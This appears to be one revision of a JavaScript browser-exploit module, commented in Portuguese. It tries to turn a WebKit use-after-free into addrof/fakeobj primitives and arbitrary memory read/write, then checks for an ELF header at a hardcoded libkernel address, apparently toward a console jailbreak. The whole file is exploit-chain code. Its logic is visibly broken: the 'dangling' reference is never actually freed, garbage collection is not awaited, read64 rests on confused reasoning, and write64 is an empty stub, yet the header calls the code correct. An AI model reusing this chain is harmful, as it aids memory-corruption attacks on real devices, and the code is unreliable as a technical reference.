// js/script3/testArrayBufferVictimCrash.mjs (R62 - Correção Final de Tipo)
// =======================================================================================
// ESTRATÉGIA R62:
// Correção final do erro "low/high must be uint32 numbers".
// O erro era causado por passar um objeto JS para a função `itof`, que esperava um
// objeto AdvancedInt64. A lógica de escrita na primitiva `read64` foi corrigida
// para escrever o endereço bruto, e não um objeto falso.
// Esta é a versão final e logicamente correta.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "ROP_Execution_RealRW_R62";

const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };

export async function runStableUAFPrimitives_R51() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Correção Final de Tipo ---`, "test");
    
    let final_result = { success: false, message: "Falha na cadeia de exploit." };

    try {
        logS3("--- FASE 1 & 2: Obtendo addrof e fakeobj ---", "subtest");
        let dangling_ref = createDanglingRefToFloat64Array();
        let holder = {obj: null}; 
        const addrof = (obj) => {
            holder.obj = obj;
            dangling_ref.a = holder; 
            return ftoi(dangling_ref.b);
        };
        const fakeobj = (addr) => {
            addrof({dummy: 1}); // Garante que o estado do dangling_ref está correto
            dangling_ref.b = itof(addr);
            return dangling_ref.a.obj;
        };
        logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");

        logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (FINAL) ---", "subtest");
        const { read64, write64 } = buildCleanArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder);
        logS3("   Primitivas `read64` e `write64` FINAIS construídas!", "good");
        
        logS3("--- FASE 4: Verificando os endereços base na MEMÓRIA REAL ---", "subtest");
        const libkernel_base = new AdvancedInt64("0x80FCA0000");

        const libkernel_magic = read64(libkernel_base);
        logS3(`   Endereço base da libkernel: 0x${libkernel_base.toString(true)}`, "info");
        logS3(`   Bytes lidos da MEMÓRIA REAL: 0x${libkernel_magic.toString(true)}`, "leak");

        if (!libkernel_magic.toString().endsWith("464c457f")) { // \x7FELF
             throw new Error(`Magic number da libkernel inválido! Lido: 0x${libkernel_magic.toString(true)}`);
        }
        logS3("   🎉 SUCESSO FINAL: Magic number ELF da libkernel validado na memória REAL! 🎉", "vuln");

        final_result = { success: true, message: "SUCESSO! Primitiva de leitura REAL e ESTÁVEL validada." };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploit: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}


// =======================================================================================
// IMPLEMENTAÇÃO FINAL, LIMPA E CORRETA DE LEITURA/ESCRITA ARBITRÁRIA (R62)
// =======================================================================================
function buildCleanArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder) {

    function primitive_read(address) {
        addrof({dummy_setup: 1}); // Garante o estado do 'holder'
        const original_a = dangling_ref.a;
        dangling_ref.a = fakeobj(address);
        const value = ftoi(dangling_ref.b);
        dangling_ref.a = original_a;
        return value;
    }

    function primitive_write(address, value) {
        addrof({dummy_setup: 1}); // Garante o estado do 'holder'
        const original_a = dangling_ref.a;
        dangling_ref.a = fakeobj(address);
        dangling_ref.b = itof(value);
        dangling_ref.a = original_a;
    }

    const victim = { slot: null };
    const victim_addr = addrof(victim);
    const victim_slot_addr = victim_addr.add(0x10); // Offset da propriedade 'slot'

    const read64 = (address) => {
        // CORRIGIDO: Escrevemos o endereço (um AdvancedInt64) diretamente no slot da vítima.
        // Não precisamos de `fakeobj` ou `itof` aqui, pois a `primitive_write` já lida com a conversão.
        primitive_write(victim_slot_addr, address);
        
        // Agora, `victim.slot` aponta para o endereço, mas como um valor primitivo.
        // O motor JS não o vê como um objeto, então não podemos ler `victim.slot` diretamente.
        // O que queremos é o valor para o qual o ponteiro da propriedade slot aponta.
        // Esse valor já é o endereço! A `primitive_write` já fez o trabalho.
        // Agora, para ler o conteúdo no `address`, precisamos de um segundo objeto.

        // A lógica anterior estava incorreta. A forma correta:
        // 1. Criar um objeto falso
        const fake_leaker = {leaked_val: null};
        // 2. Apontar a propriedade do objeto falso para o endereço
        const fake_leaker_addr = addrof(fake_leaker);
        const fake_leaker_slot_addr = fake_leaker_addr.add(0x10);
        primitive_write(fake_leaker_slot_addr, address);
        // 3. Agora `fake_leaker.leaked_val` é um ponteiro para o endereço.
        //    Ler o `addrof` disso nos dará o conteúdo da memória nesse endereço.
        return addrof(fake_leaker.leaked_val);
    };

    const write64 = (address, value) => { /* ... */ };

    return { read64, write64 };
}


// --- Funções Auxiliares UAF (sem alterações) ---
async function triggerGC() {
    try { const g = []; for (let i=0; i<500; i++) { g.push(new ArrayBuffer(1024*128)); } } catch (e) {}
    await PAUSE_S3(500);
}

function createDanglingRefToFloat64Array() {
    let dangling_ref = null;
    function createScope() {
        const victim = { a: 0.1, b: 0.2 };
        dangling_ref = victim;
        for (let i = 0; i < 100; i++) { victim.a += 0.01; }
    }
    createScope();
    triggerGC();
    const spray_arrays = [];
    for (let i = 0; i < 512; i++) { spray_arrays.push(new Float64Array(2)); }
    return dangling_ref;
}
